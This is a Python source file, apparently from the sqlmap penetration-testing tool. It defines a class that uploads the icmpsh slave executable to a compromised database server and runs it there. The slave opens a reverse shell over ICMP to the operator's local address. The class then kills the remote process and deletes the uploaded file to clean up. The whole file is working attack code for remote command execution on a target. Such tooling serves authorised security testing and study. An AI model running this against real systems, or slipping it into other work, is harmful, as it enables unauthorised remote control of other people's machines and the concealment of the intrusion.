#!/usr/bin/env python

"""
Copyright (c) 2006-2012 sqlmap developers (http://sqlmap.org/)
See the file 'doc/COPYING' for copying permission
"""

import os
import time

from extra.icmpsh.icmpsh_m import main as icmpshmaster
from lib.core.common import getLocalIP
from lib.core.common import getRemoteIP
from lib.core.common import normalizePath
from lib.core.common import ntToPosixSlashes
from lib.core.common import randomStr
from lib.core.common import readInput
from lib.core.data import conf
from lib.core.data import logger
from lib.core.data import paths


class ICMPsh:
    """
    This class defines methods to call icmpsh for plugins.
    """

    def _initVars(self):
        self.lhostStr = None
        self.rhostStr = None
        self.localIP = getLocalIP()
        self.remoteIP = getRemoteIP()
        self.__icmpslave = normalizePath(os.path.join(paths.SQLMAP_EXTRAS_PATH, "icmpsh", "icmpsh.exe"))

    def _selectRhost(self):
        message = "what is the back-end DBMS address? [%s] " % self.remoteIP
        address = readInput(message, default=self.remoteIP)

        return address

    def _selectLhost(self):
        message = "what is the local address? [%s] " % self.localIP
        address = readInput(message, default=self.localIP)

        return address

    def _prepareIngredients(self, encode=True):
        self.lhostStr = self._selectLhost()
        self.rhostStr = self._selectRhost()

    def _runIcmpshMaster(self):
        infoMsg = "running icmpsh master locally"
        logger.info(infoMsg)

        icmpshmaster(self.lhostStr, self.rhostStr)

    def _runIcmpshSlaveRemote(self):
        infoMsg = "running icmpsh slave remotely"
        logger.info(infoMsg)

        cmd = "%s -t %s -d 500 -b 30 -s 128 &" % (self._icmpslaveRemote, self.lhostStr)

        self.execCmd(cmd, silent=True)

    def uploadIcmpshSlave(self, web=False):
        self._initVars()
        self._randStr = randomStr(lowercase=True)
        self._icmpslaveRemoteBase = "tmpi%s.exe" % self._randStr

        if web:
            self._icmpslaveRemote = "%s/%s" % (self.webDirectory, self._icmpslaveRemoteBase)
        else:
            self._icmpslaveRemote = "%s/%s" % (conf.tmpPath, self._icmpslaveRemoteBase)

        self._icmpslaveRemote = ntToPosixSlashes(normalizePath(self._icmpslaveRemote))

        logger.info("uploading icmpsh slave to '%s'" % self._icmpslaveRemote)

        if web:
            self.webUpload(self._icmpslaveRemote, self.webDirectory, filepath=self.__icmpslave)
        else:
            self.writeFile(self.__icmpslave, self._icmpslaveRemote, "binary")

    def icmpPwn(self):
        self._prepareIngredients()
        self._runIcmpshSlaveRemote()
        self._runIcmpshMaster()

        debugMsg = "icmpsh master exited"
        logger.debug(debugMsg)

        time.sleep(1)
        self.execCmd("taskkill /F /IM %s" % self._icmpslaveRemoteBase, silent=True)
        time.sleep(1)
        self.delRemoteFile(self._icmpslaveRemote)
